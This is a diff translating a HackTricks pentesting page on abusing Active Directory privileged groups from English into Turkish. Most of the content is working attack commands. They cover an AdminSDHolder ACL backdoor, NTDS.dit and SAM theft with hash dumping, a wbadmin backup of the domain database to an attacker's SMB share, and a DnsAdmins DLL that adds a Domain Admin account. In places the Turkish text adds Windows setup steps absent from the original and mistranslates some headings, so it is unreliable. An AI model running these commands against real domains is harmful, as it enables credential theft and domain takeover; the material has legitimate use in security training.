@@ -1,120 +1,119 @@
-# Privileged Groups
+# Ayrıcalıklı Gruplar
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> öğrenin!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'i desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
+* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.
 
 </details>
 
-## Well Known groups with administration privileges
+## Yönetici ayrıcalıklarına sahip bilinen gruplar
 
-* **Administrators**
-* **Domain Admins**
-* **Enterprise Admins**
+* **Yöneticiler**
+* **Alan Yöneticileri**
+* **Kurumsal Yöneticiler**
 
-## Account Operators
+## Hesap Operatörleri
 
-This group is empowered to create accounts and groups that are not administrators on the domain. Additionally, it enables local login to the Domain Controller (DC).
+Bu grup, etki alanında yönetici olmayan hesaplar ve gruplar oluşturma yetkisine sahiptir. Ayrıca, Etki Alanı Denetleyicisine (DC) yerel oturum açmayı etkinleştirir.
 
-To identify the members of this group, the following command is executed:
-
+Bu grubun üyelerini belirlemek için aşağıdaki komut çalıştırılır:
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
+Yeni kullanıcı eklemek ve DC01'e yerel giriş yapmak izinlidir.
 
-Adding new users is permitted, as well as local login to DC01.
+## AdminSDHolder grubu
 
-## AdminSDHolder group
+**AdminSDHolder** grubunun Erişim Kontrol Listesi (ACL), Active Directory'deki tüm "korunan gruplar" için izinleri belirleyen önemli bir mekanizmadır, yüksek ayrıcalıklı gruplar da dahil. Bu mekanizma, yetkisiz değişiklikleri önleyerek bu grupların güvenliğini sağlar.
 
-The **AdminSDHolder** group's Access Control List (ACL) is crucial as it sets permissions for all "protected groups" within Active Directory, including high-privilege groups. This mechanism ensures the security of these groups by preventing unauthorized modifications.
+Bir saldırgan, **AdminSDHolder** grubunun ACL'sini değiştirerek bir standart kullanıcıya tam izinler verebilir. Bu, bu kullanıcıya tüm korunan gruplar üzerinde tam kontrol sağlar. Bu kullanıcının izinleri değiştirilse veya kaldırılsa bile, sistem tasarımı gereği bir saat içinde otomatik olarak yeniden yüklenir.
 
-An attacker could exploit this by modifying the **AdminSDHolder** group's ACL, granting full permissions to a standard user. This would effectively give that user full control over all protected groups. If this user's permissions are altered or removed, they would be automatically reinstated within an hour due to the system's design.
-
-Commands to review the members and modify permissions include:
-
+Üyeleri incelemek ve izinleri değiştirmek için kullanılan komutlar:
 ```powershell
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
+Kurtarma sürecini hızlandırmak için bir komut dosyası mevcuttur: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
 
-A script is available to expedite the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
+Daha fazla ayrıntı için [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) adresini ziyaret edin.
 
-For more details, visit [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
+## AD Geri Dönüşüm Kutusu
 
-## AD Recycle Bin
-
-Membership in this group allows for the reading of deleted Active Directory objects, which can reveal sensitive information:
-
+Bu gruba üyelik, silinmiş Active Directory nesnelerinin okunmasına izin verir ve hassas bilgileri ortaya çıkarabilir:
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
+### Erişim Denetleyicisi Erişimi
 
-### Domain Controller Access
+Kullanıcının DC üzerindeki dosyalara erişimi kısıtlıdır, ancak kullanıcı `Server Operators` grubunun bir parçasıysa erişim düzeyi değişir.
 
-Access to files on the DC is restricted unless the user is part of the `Server Operators` group, which changes the level of access.
+### Ayrıcalık Yükseltme
 
-### Privilege Escalation
-
-Using `PsService` or `sc` from Sysinternals, one can inspect and modify service permissions. The `Server Operators` group, for instance, has full control over certain services, allowing for the execution of arbitrary commands and privilege escalation:
-
+Sysinternals'ten `PsService` veya `sc` kullanarak hizmet izinlerini inceleyip değiştirebilirsiniz. Örneğin, `Server Operators` grubu belirli hizmetler üzerinde tam kontrol sahibidir, bu da keyfi komutların yürütülmesine ve ayrıcalık yükseltmeye olanak tanır:
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
+Bu komut, `Server Operators`'ün tam erişime sahip olduğunu ortaya çıkarır ve böylece yükseltilmiş ayrıcalıklar için hizmetlerin manipülasyonunu mümkün kılar.
 
-This command reveals that `Server Operators` have full access, enabling the manipulation of services for elevated privileges.
+## Yedek Operatörleri
 
-## Backup Operators
+`Yedek Operatörleri` grubuna üyelik, `DC01` dosya sistemi erişimini `SeBackup` ve `SeRestore` ayrıcalıkları sayesinde sağlar. Bu ayrıcalıklar, `FILE_FLAG_BACKUP_SEMANTICS` bayrağı kullanarak, açık izinler olmadan bile klasör gezinme, listeleme ve dosya kopyalama yetenekleri sağlar. Bu işlem için belirli komut dosyalarının kullanılması gerekmektedir.
 
-Membership in the `Backup Operators` group provides access to the `DC01` file system due to the `SeBackup` and `SeRestore` privileges. These privileges enable folder traversal, listing, and file copying capabilities, even without explicit permissions, using the `FILE_FLAG_BACKUP_SEMANTICS` flag. Utilizing specific scripts is necessary for this process.
-
-To list group members, execute:
-
+Grup üyelerini listelemek için şunu çalıştırın:
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
+### Yerel Saldırı
 
-### Local Attack
+Bu ayrıcalıkları yerel olarak kullanmak için aşağıdaki adımlar kullanılır:
 
-To leverage these privileges locally, the following steps are employed:
-
-1. Import necessary libraries:
-
+1. Gerekli kütüphaneleri içe aktarın:
 ```bash
 Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
+2. `SeBackupPrivilege` yetkisini etkinleştirin ve doğrulayın:
 
-2. Enable and verify `SeBackupPrivilege`:
+```plaintext
+1. Yönetici olarak oturum açın.
+2. Başlat menüsünden "Local Security Policy" (Yerel Güvenlik Politikası) uygulamasını açın.
+3. "Local Policies" (Yerel Politikalar) altında "User Rights Assignment" (Kullanıcı Hakları Ataması) seçeneğini bulun ve tıklayın.
+4. Sağ panelde, "Backup files and directories" (Dosyaları ve dizinleri yedekle) öğesini bulun ve çift tıklayın.
+5. "Local Security Setting" (Yerel Güvenlik Ayarları) penceresinde, "Add User or Group" (Kullanıcı veya Grup Ekle) düğmesine tıklayın.
+6. "Select Users or Groups" (Kullanıcıları veya Grupları Seç) penceresinde, "Advanced" (Gelişmiş) düğmesine tıklayın.
+7. "Find Now" (Şimdi Bul) düğmesine tıklayın ve "Administrators" (Yöneticiler) grubunu seçin.
+8. "OK" düğmesine tıklayın ve "Apply" (Uygula) düğmesine tıklayarak değişiklikleri kaydedin.
+9. "OK" düğmesine tıklayarak pencereyi kapatın.
+10. Bilgisayarı yeniden başlatın.
+11. `whoami /priv` komutunu kullanarak `SeBackupPrivilege` yetkisinin etkinleştirildiğini doğrulayın.
+```
 
+Bu adımları takip ederek `SeBackupPrivilege` yetkisini etkinleştirebilir ve doğrulayabilirsiniz.
 ```bash
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-
-3. Access and copy files from restricted directories, for instance:
-
+3. Kısıtlı dizinlere erişim sağlayın ve dosyaları kopyalayın, örneğin:
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
 ```
+### AD Saldırısı
 
-### AD Attack
+Erişim kontrolü doğrudan Etki Alanı Denetleyicisi'nin dosya sistemine izin verir ve bu da tüm etki alanı kullanıcıları ve bilgisayarları için NTLM karma değerlerini içeren `NTDS.dit` veritabanının çalınmasına olanak sağlar.
 
-Direct access to the Domain Controller's file system allows for the theft of the `NTDS.dit` database, which contains all NTLM hashes for domain users and computers.
+#### diskshadow.exe Kullanarak
 
-#### Using diskshadow.exe
-
-1. Create a shadow copy of the `C` drive:
-
+1. `C` sürücüsünün bir gölge kopyasını oluşturun:
 ```cmd
 diskshadow.exe
 set verbose on
@@ -127,70 +126,59 @@ expose %cdrive% F:
 end backup
 exit
 ```
-
-2. Copy `NTDS.dit` from the shadow copy:
-
+2. Gölge kopyasından `NTDS.dit` dosyasını kopyalayın:
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-
-Alternatively, use `robocopy` for file copying:
-
+Alternatif olarak, dosya kopyalamak için `robocopy` kullanın:
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
-
-3. Extract `SYSTEM` and `SAM` for hash retrieval:
-
+3. Hash alımı için `SYSTEM` ve `SAM` dosyalarını çıkarın:
 ```cmd
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-
-4. Retrieve all hashes from `NTDS.dit`:
-
+4. `NTDS.dit` dosyasından tüm karma değerlerini alın:
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
+#### wbadmin.exe Kullanımı
 
-#### Using wbadmin.exe
+1. Saldırgan makinede SMB sunucusu için NTFS dosya sistemi kurulumu yapın ve hedef makinede SMB kimlik bilgilerini önbelleğe alın.
+2. Sistem yedeklemesi ve `NTDS.dit` çıkarma için `wbadmin.exe` kullanın:
+```cmd
+net use X: \\<SaldırganIP>\paylaşadı /user:smbkullanıcı şifre
+echo "Y" | wbadmin start backup -backuptarget:\\<SaldırganIP>\paylaşadı -include:c:\windows\ntds
+wbadmin get versions
+echo "Y" | wbadmin start recovery -version:<tarih-saat> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
+```
 
-1. Set up NTFS filesystem for SMB server on attacker machine and cache SMB credentials on the target machine.
-2. Use `wbadmin.exe` for system backup and `NTDS.dit` extraction:
-    ```cmd
-    net use X: \\<AttackIP>\sharename /user:smbuser password
-    echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
-    wbadmin get versions
-    echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
-    ```
-
-For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
+Pratik bir gösterim için [IPPSEC İLE DEMO VİDEOYA](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s) bakın.
 
 ## DnsAdmins
 
-Members of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.
+**DnsAdmins** grubunun üyeleri, genellikle Etki Alanı Denetleyicilerinde barındırılan bir DNS sunucusunda SYSTEM ayrıcalıklarıyla keyfi bir DLL yükleyebilir ve bu yetenek önemli bir istismar potansiyeli sunar.
 
-To list members of the DnsAdmins group, use:
-
+DnsAdmins grubunun üyelerini listelemek için kullanın:
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
+### Keyfi DLL Yürütme
 
-### Execute arbitrary DLL
-
-Members can make the DNS server load an arbitrary DLL (either locally or from a remote share) using commands such as:
-
+Üyeler, DNS sunucusunun yerel olarak veya uzaktan paylaşımdan isteğe bağlı bir DLL yüklemesini sağlayabilirler. Bunun için aşağıdaki gibi komutlar kullanılabilir:
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
 An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
 ```
+
 ```c
 // Modify DLL to add user
 DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
 {
-    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
-    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
+system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
+system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
 }
 ```
 
@@ -198,99 +186,79 @@ DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunct
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-
-Restarting the DNS service (which may require additional permissions) is necessary for the DLL to be loaded:
-
+DNS hizmetini yeniden başlatmak (ek izin gerektirebilir) DLL'nin yüklenmesi için gereklidir:
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-
-For more details on this attack vector, refer to ired.team.
+Bu saldırı vektörü hakkında daha fazla ayrıntı için ired.team'a başvurun.
 
 #### Mimilib.dll
-It's also feasible to use mimilib.dll for command execution, modifying it to execute specific commands or reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.
+Komut yürütme için mimilib.dll kullanmak da mümkündür, özel komutları veya ters kabukları yürütmek için değiştirilebilir. Daha fazla bilgi için [bu yayına](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) bakın.
 
-### WPAD Record for MitM
-DnsAdmins can manipulate DNS records to perform Man-in-the-Middle (MitM) attacks by creating a WPAD record after disabling the global query block list. Tools like Responder or Inveigh can be used for spoofing and capturing network traffic.
+### WPAD Kaydı için MitM
+DnsAdmins, küresel sorgu engelleme listesini devre dışı bıraktıktan sonra WPAD kaydı oluşturarak Man-in-the-Middle (MitM) saldırıları gerçekleştirmek için DNS kayıtlarını manipüle edebilir. Responder veya Inveigh gibi araçlar, sahtelemeyi ve ağ trafiğini yakalamayı sağlamak için kullanılabilir.
 
-### Event Log Readers
-Members can access event logs, potentially finding sensitive information such as plaintext passwords or command execution details:
-
+### Olay Günlüğü Okuyucuları
+Üyeler olay günlüklerine erişebilir ve potansiyel olarak düz metin şifreleri veya komut yürütme ayrıntıları gibi hassas bilgiler bulabilirler:
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
-
-## Exchange Windows Permissions
-This group can modify DACLs on the domain object, potentially granting DCSync privileges. Techniques for privilege escalation exploiting this group are detailed in Exchange-AD-Privesc GitHub repo.
-
+## Exchange Windows İzinleri
+Bu grup, etki alanı nesnesindeki DACL'leri değiştirebilir ve potansiyel olarak DCSync ayrıcalıklarını sağlayabilir. Bu grup tarafından istismar edilen ayrıcalık yükseltme teknikleri Exchange-AD-Privesc GitHub deposunda detaylı olarak açıklanmıştır.
 ```powershell
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
+## Hyper-V Yöneticileri
+Hyper-V Yöneticileri, Hyper-V'ye tam erişime sahiptir ve bu, sanallaştırılmış Etki Alanı Denetleyicileri üzerinde kontrol elde etmek için kullanılabilir. Bu, canlı DC'leri klonlamak ve NTDS.dit dosyasından NTLM karma değerlerini çıkarmak anlamına gelir.
 
-## Hyper-V Administrators
-Hyper-V Administrators have full access to Hyper-V, which can be exploited to gain control over virtualized Domain Controllers. This includes cloning live DCs and extracting NTLM hashes from the NTDS.dit file.
-
-### Exploitation Example
-Firefox's Mozilla Maintenance Service can be exploited by Hyper-V Administrators to execute commands as SYSTEM. This involves creating a hard link to a protected SYSTEM file and replacing it with a malicious executable:
-
+### Sömürü Örneği
+Firefox'un Mozilla Bakım Servisi, Hyper-V Yöneticileri tarafından SYSTEM olarak komutları yürütmek için sömürülebilir. Bu, korumalı bir SYSTEM dosyasına bir sert bağlantı oluşturmayı ve onu kötü amaçlı bir yürütülebilir dosya ile değiştirmeyi içerir:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
-
-Note: Hard link exploitation has been mitigated in recent Windows updates.
+Not: Hard link saldırısı, son Windows güncellemeleriyle önlenmiştir.
 
 ## Organization Management
 
-In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.
+**Microsoft Exchange**'in kullanıldığı ortamlarda, **Organization Management** adı verilen özel bir grup önemli yeteneklere sahiptir. Bu grup, **tüm alan kullanıcılarının posta kutularına erişim** hakkına sahiptir ve **'Microsoft Exchange Güvenlik Grupları'** Organizasyon Birimi (OU) üzerinde **tam kontrol** sağlar. Bu kontrol, ayrıcalık yükseltme için kullanılabilecek **`Exchange Windows İzinleri`** grubunu da içerir.
 
-### Privilege Exploitation and Commands
+### Ayrıcalık Kullanımı ve Komutlar
 
-#### Print Operators
-Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.
+#### Yazıcı Operatörleri
+**Yazıcı Operatörleri** grubunun üyeleri, **`SeLoadDriverPrivilege`** dahil olmak üzere birkaç ayrıcalığa sahiptir. Bu ayrıcalıklar, **bir Etki Alanı Denetleyicisine yerel olarak oturum açma**, onu kapatma ve yazıcıları yönetme izni verir. Bu ayrıcalıkları sömürmek için özellikle **`SeLoadDriverPrivilege`** bir yükseltilmemiş bağlamda görünmüyorsa, Kullanıcı Hesabı Denetimi (UAC) atlatılması gerekmektedir.
 
-To list the members of this group, the following PowerShell command is used:
-
+Bu grubun üyelerini listelemek için aşağıdaki PowerShell komutu kullanılır:
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
+**`SeLoadDriverPrivilege`** ile ilgili daha detaylı saldırı teknikleri için, belirli güvenlik kaynaklarına başvurulmalıdır.
 
-For more detailed exploitation techniques related to **`SeLoadDriverPrivilege`**, one should consult specific security resources.
-
-#### Remote Desktop Users
-This group's members are granted access to PCs via Remote Desktop Protocol (RDP). To enumerate these members, PowerShell commands are available:
-
+#### Uzak Masaüstü Kullanıcıları
+Bu grubun üyeleri, Uzak Masaüstü Protokolü (RDP) aracılığıyla PC'lere erişim izni verilir. Bu üyeleri sıralamak için PowerShell komutları kullanılabilir:
 ```powershell
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
+RDP'yi sömürme konusunda daha fazla bilgi, ayrılmış pentesting kaynaklarında bulunabilir.
 
-Further insights into exploiting RDP can be found in dedicated pentesting resources.
-
-#### Remote Management Users
-Members can access PCs over **Windows Remote Management (WinRM)**. Enumeration of these members is achieved through:
-
+#### Uzaktan Yönetim Kullanıcıları
+Üyeler, Windows Uzaktan Yönetim (WinRM) üzerinden PC'lere erişebilir. Bu üyelerin sıralaması şu şekilde gerçekleştirilir:
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
-
-For exploitation techniques related to **WinRM**, specific documentation should be consulted.
-
-#### Server Operators
-This group has permissions to perform various configurations on Domain Controllers, including backup and restore privileges, changing system time, and shutting down the system. To enumerate the members, the command provided is:
-
+**Sunucu Operatörleri**
+Bu grup, Etki Alanı Denetleyicileri üzerinde çeşitli yapılandırmalar yapma iznine sahiptir, bunlar arasında yedekleme ve geri yükleme yetkileri, sistem saati değiştirme ve sistemi kapatma bulunur. Üyeleri sıralamak için kullanılan komut:
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
-
-
-## References <a href="#references" id="references"></a>
+## Referanslar <a href="#referanslar" id="referanslar"></a>
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
 * [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
@@ -309,14 +277,14 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hackleme hakkında sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'ı desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
+* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** katkıda bulunun.
 
 </details>
